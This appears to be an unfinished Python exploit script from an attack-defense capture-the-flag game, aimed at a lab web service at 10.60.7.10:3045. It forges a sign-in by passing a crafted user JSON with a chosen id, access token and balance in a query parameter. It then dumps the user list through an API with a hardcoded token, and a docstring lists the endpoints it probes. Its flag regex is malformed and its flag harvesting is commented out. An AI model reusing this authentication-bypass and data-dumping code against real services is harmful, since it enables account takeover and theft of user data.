#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
import requests as req
import sys
import json
import string
import random

FLAG_FORMAT = r"([a-zA-Z0-9]{31-36})"


def find_flags(data):
    return re.findall(FLAG_FORMAT, data) or []

def GenTextByLength(length):
    text = []
    alphabet = string.ascii_letters + string.digits
    if length < 62:
        for letter in alphabet:
            text.append(letter)
        random.shuffle(text)
        return ''.join(text[:length])




def parseData(s, method, url, params):
    if method == 'GET':
        data = s.get('{}{}access-token=asdsadsadsad'.format(url, params))
    elif method == 'POST':
        data = s.post('{}{}access-token=asdsadsadsad'.format(url, params))
    elif method == 'DELETE':
        data = s.delete('{}{}access-token=asdsadsadsad'.format(url, params))

    print(data.text)
    response = json.loads(data.text)
    for user_list in response['data']:
        # print(user)
        for key in user_list:
            print('{} - {}'.format(str(key), user_list[key]) if key != '_links' else '')


"""
GET /api/users/inventory/{ID}?access-token=asdsadsadsad
POST /modification_buy?token={TOKEN}&access-token=asdsadsadsad





POST /api/repos/commit?repo_url={LOGIN}/{REP}&access-token=asdsadsadsad
GET /api/repos/commit/{HASH}?access-token=asdsadsadsad
DELETE /api/repos/{ID}?access-token=asdsadsadsad

GET /api/repos/commit/{HASH}?access-token=asdsadsadsad
GET /api/repos?r={LOGIN}/{REP}&access-token=asdsadsadsad
GET /api/users/{ID}?access-token=asdsadsadsad - Узнать всё о юзере по ID
GET /api/repos/search/{ID}?access-token=asdsadsadsad - Есть hash и URL репозитория
POST /api/shop/buy/{TOKEN}?access-token=asdsadsadsad - купить предмет пользователя по токену
GET /api/shop/{TOKEN}?access-token=asdsadsadsad
GET /api/users/inventory/{ID}?access-token=asdsadsadsad
POST /api/users/signin?user={}?access-token=asdsadsadsad
POST /api/users?access-token=asdsadsadsad
GET /api/shop?access-token=asdsadsadsad
"""


def exploit(url):
    flags = []
    s = req.session()
    #parseData(s, 'GET', url + '/api/shop/eOvYzQC62LjkE-hFNT89MaLw5WPKmv2O', '?')
    #data = s.post(url+'/api/shop/eOvYzQC62LjkE-hFNT89MaLw5WPKmv2O', data={'repo_url': repo_url, 'access-token': 'asdsadsadsad'})
    s.get(url+'/signin?user={%22id%22:42,%22username%22:%22asdsafasfsafsa%22,%22first_name%22:%22asdsafasfsafsa%22,%22second_name%22:%22asdsafasfsafsa%22,%22hit%22:%22aaaaaaaaaaaaaaaaaaaa%22,%22access_token%22:%226924c94bdae05d5d293da110ef7f29a07e89cca6%22,%22money%22:2755,%22created_at%22:%2228.04.2019%22}')
    data = s.post(url+'/api/users', data={'access-token': 'asdsadsadsad'})
    # data = s.get('http://10.60.8.10:3045/api/users?access-token=asdsadsadsad')
    response = json.loads(data.text)
    print(data.text)
    #for key in response['data']:
    #    print(key)
    #getreq(url, '/api/shop/modification_buy?token={}'.format(token), s)
    #flags.extend(find_flags(resp.text))
    #for i in range(len(flags)):
    #    flags[i] = flags[i] + '='
    #return flags


if __name__ == "__main__":
    # На вход получаем адрес команды
    # url = sys.argv[1]
    # url = url[:-1] + '2'
    # print(url)
    url = 'http://10.60.7.10:3045'
    # Возвращаем ответ в консоль, чтобы наш основной процесс перехватил сообщение
    print(exploit(url), flush=True)